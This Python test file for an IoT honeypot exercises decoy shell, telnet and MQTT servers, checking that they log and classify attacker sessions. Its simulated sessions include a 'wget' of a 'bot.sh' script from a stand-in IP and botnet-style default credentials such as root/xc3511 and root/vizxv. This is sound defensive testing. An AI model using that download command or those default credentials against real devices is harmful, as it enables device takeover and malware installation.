"""Integration tests: real decoy servers on ephemeral ports."""

import threading

import pytest

from app import database
from app.config import settings
from services.fake_mqtt import create_mqtt_server
from services.fake_shell import create_shell_server
from services.fake_telnet import create_telnet_server
from services.tcp_base import ConnectionLimiter, limiter
from tests.conftest import Client, wait_for_event

IAC, DO, WILL, WONT, DONT = 255, 253, 251, 252, 254


@pytest.fixture
def shell_port():
    server = create_shell_server("127.0.0.1", 0)
    server.start()
    yield server.port
    server.stop()


@pytest.fixture
def telnet_port():
    server = create_telnet_server("127.0.0.1", 0)
    server.start()
    yield server.port
    server.stop()


@pytest.fixture
def mqtt_port():
    server = create_mqtt_server("127.0.0.1", 0)
    server.start()
    yield server.port
    server.stop()


def _login(client, username=b"root", password=b"xc3511"):
    client.read_until(b"login: ")
    client.send(username + b"\r\n")
    client.read_until(b"Password: ")
    client.send(password + b"\r\n")
    client.read_until(b"# ")


def test_shell_full_session(shell_port):
    client = Client(shell_port)
    _login(client)

    client.send(b"cd /tmp\n")
    assert client.read_until(b"# ").endswith(b"root@iot-camera:/tmp# ")
    client.send(b"wget http://198.51.100.7/bot.sh\n")
    client.read_until(b"# ")
    client.send(b"ls\n")
    assert b"bot.sh" in client.read_until(b"# ")
    client.send(b"exit\n")
    assert client.wait_closed()

    end = wait_for_event("session_end")
    assert "reason=client_exit" in end["raw_input"] and "commands=4" in end["raw_input"]

    session = database.get_events(session_id=end["session_id"])
    by_type = {event["event_type"]: event for event in session}
    assert by_type["login_attempt"]["raw_input"] == "login_attempt username=root password=xc3511"
    assert by_type["login_attempt"]["classification"] == "credential_attack"
    commands = {e["raw_input"]: e["classification"] for e in session if e["event_type"] == "command"}
    assert commands["wget http://198.51.100.7/bot.sh"] == "malware_download_attempt"
    assert commands["ls"] == "reconnaissance"
    assert all(event["source_port"] for event in session)


def test_command_split_across_tcp_segments_is_one_event(shell_port):
    client = Client(shell_port)
    _login(client)
    for chunk in (b"una", b"me ", b"-a"):
        client.send(chunk)
        threading.Event().wait(0.1)
    client.send(b"\n")
    assert b"armv7l" in client.read_until(b"# ")
    client.close()

    wait_for_event("session_end")
    commands = [e["raw_input"] for e in database.get_events() if e["event_type"] == "command"]
    assert commands == ["uname -a"]


def test_several_commands_in_one_segment(shell_port):
    client = Client(shell_port)
    _login(client)
    client.send(b"whoami\nid\npwd\n")
    for _ in range(3):
        client.read_until(b"# ")
    client.close()
    wait_for_event("session_end")
    commands = [e["raw_input"] for e in database.get_events() if e["event_type"] == "command"]
    assert sorted(commands) == ["id", "pwd", "whoami"]


def test_empty_password_is_rejected_then_disconnected(shell_port):
    client = Client(shell_port)
    for _ in range(3):
        client.read_until(b"login: ")
        client.send(b"admin\n")
        client.read_until(b"Password: ")
        client.send(b"\n")
        client.read_until(b"Login incorrect")
    assert client.wait_closed()
    assert "reason=login_failed" in wait_for_event("session_end")["raw_input"]


def test_idle_client_is_disconnected(shell_port):
    client = Client(shell_port)
    client.read_until(b"login: ")
    assert client.wait_closed(timeout=settings.idle_timeout + 4)
    assert "reason=timeout" in wait_for_event("session_end")["raw_input"]


def test_oversized_line_is_truncated_not_buffered(shell_port):
    client = Client(shell_port)
    _login(client)
    client.send(b"A" * 5000 + b"\nwhoami\n")
    client.read_until(b"root\r\n")
    client.close()
    event = wait_for_event("command_truncated")
    assert event["raw_input"] == "A" * settings.max_line_bytes
    wait_for_event("session_end")
    # The discarded tail must not show up as extra commands.
    commands = [e["raw_input"] for e in database.get_events() if e["event_type"] == "command"]
    assert commands == ["whoami"]


def test_oversized_line_without_newline(shell_port):
    client = Client(shell_port)
    _login(client)
    client.send(b"B" * 3000)
    client.read_until(b"# ")
    client.send(b"B" * 3000 + b"\nid\n")
    client.read_until(b"uid=0(root)")
    client.close()
    wait_for_event("session_end")
    kinds = [(e["event_type"], len(e["raw_input"])) for e in database.get_events()
             if e["event_type"].startswith("command")]
    assert sorted(kinds) == [("command", 2), ("command_truncated", settings.max_line_bytes)]


def test_command_limit(shell_port):
    client = Client(shell_port)
    _login(client)
    client.send(b"true\n" * (settings.max_commands_per_session + 10))
    assert client.wait_closed()
    assert "reason=command_limit" in wait_for_event("session_end")["raw_input"]


def test_binary_garbage_does_not_crash(shell_port):
    client = Client(shell_port)
    client.send(bytes(range(256)) * 4 + b"\n")
    client.close()
    wait_for_event("session_end")

    # The server still accepts a new, well-behaved client.
    follow_up = Client(shell_port)
    _login(follow_up)
    follow_up.close()


def test_telnet_negotiation_is_stripped_and_refused(telnet_port):
    client = Client(telnet_port)
    client.send(bytes([IAC, DO, 1, IAC, WILL, 24, IAC, WILL, 31]))
    client.read_until(b"login: ")
    reply = client.read_exact(9)
    assert reply == bytes([IAC, WONT, 1, IAC, DONT, 24, IAC, DONT, 31])

    # Telnet line ending is CR NUL or CR LF; a negotiation is split mid-sequence.
    client.send(b"root\r\x00")
    client.read_until(b"Password: ")
    client.send(b"vizxv" + bytes([IAC]))
    client.send(bytes([DO, 3]) + b"\r\n")
    client.read_until(b"# ")
    client.send(b"whoami\r\n")
    assert b"root\r\n" in client.read_until(b"# ")
    client.close()

    login = wait_for_event("login_attempt", service="fake_telnet")
    assert login["raw_input"] == "login_attempt username=root password=vizxv"


def _mqtt_string(text: bytes) -> bytes:
    return len(text).to_bytes(2, "big") + text


def _mqtt_packet(first_byte: int, body: bytes) -> bytes:
    assert len(body) < 128
    return bytes([first_byte, len(body)]) + body


def test_mqtt_session(mqtt_port):
    client = Client(mqtt_port)
    connect = (
        _mqtt_string(b"MQTT") + bytes([4, 0xC2, 0, 60])
        + _mqtt_string(b"scanner-1") + _mqtt_string(b"admin") + _mqtt_string(b"public")
    )
    client.send(_mqtt_packet(0x10, connect))
    assert client.read_exact(4) == b"\x20\x02\x00\x00"

    subscribe = b"\x00\x07" + _mqtt_string(b"#") + b"\x00" + _mqtt_string(b"cam/+/cmd") + b"\x01"
    client.send(_mqtt_packet(0x82, subscribe))
    assert client.read_exact(6) == b"\x90\x04\x00\x07\x00\x00"

    publish = _mqtt_string(b"cam/1/cmd") + b"\x00\x09" + b"reboot"
    client.send(_mqtt_packet(0x32, publish))  # QoS 1
    assert client.read_exact(4) == b"\x40\x02\x00\x09"

    client.send(b"\xc0\x00")
    assert client.read_exact(2) == b"\xd0\x00"
    client.send(b"\xe0\x00")
    assert client.wait_closed()

    connect_event = wait_for_event("mqtt_connect")
    assert connect_event["raw_input"] == (
        "connect protocol=MQTT/4 client_id=scanner-1 username=admin password=public"
    )
    assert connect_event["classification"] == "credential_attack"
    assert wait_for_event("mqtt_subscribe")["raw_input"] == "subscribe topic=# topic=cam/+/cmd"
    assert wait_for_event("mqtt_publish")["raw_input"] == "publish topic=cam/1/cmd qos=1 payload=reboot"
    assert "reason=client_disconnect" in wait_for_event("session_end")["raw_input"]


def test_mqtt_v5_connect(mqtt_port):
    client = Client(mqtt_port)
    connect = _mqtt_string(b"MQTT") + bytes([5, 0x02, 0, 30, 0]) + _mqtt_string(b"v5client")
    client.send(_mqtt_packet(0x10, connect))
    assert client.read_exact(5) == b"\x20\x03\x00\x00\x00"
    client.close()
    assert "protocol=MQTT/5 client_id=v5client" in wait_for_event("mqtt_connect")["raw_input"]


def test_mqtt_logs_non_mqtt_traffic_immediately(mqtt_port):
    client = Client(mqtt_port)
    client.send(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
    assert client.wait_closed(timeout=4)
    event = wait_for_event("mqtt_malformed")
    assert "GET / HTTP/1.1" in event["raw_input"]


@pytest.mark.parametrize(
    "packet",
    [
        b"\x10\x02\x00\x04",                      # truncated CONNECT
        b"\x10\x7f" + b"\xff" * 127,               # lengths pointing past the end
        b"\x10\xff\xff\xff\xff\x7f",               # over-long remaining length
        b"\x10\xff\xff\xff\x7f",                   # 256 MB packet claim
    ],
)
def test_mqtt_malformed_packets(mqtt_port, packet):
    client = Client(mqtt_port)
    client.send(packet)
    assert client.wait_closed(timeout=4)
    assert wait_for_event("mqtt_malformed")


def test_connection_limiter():
    caps = ConnectionLimiter(max_total=3, max_per_ip=2)
    assert caps.acquire("a") and caps.acquire("a")
    assert not caps.acquire("a")          # per-IP cap
    assert caps.acquire("b")
    assert not caps.acquire("c")          # global cap
    caps.release("a")
    assert caps.acquire("c")
    for ip in ("a", "b", "c"):
        caps.release(ip)
    assert caps.active == 0


def test_per_ip_cap_refuses_extra_connections(shell_port, monkeypatch):
    monkeypatch.setattr(limiter, "max_per_ip", 2)
    held = [Client(shell_port) for _ in range(2)]
    for client in held:
        client.read_until(b"login: ")

    extra = Client(shell_port)
    assert extra.wait_closed(timeout=3)
    for client in held:
        client.close()
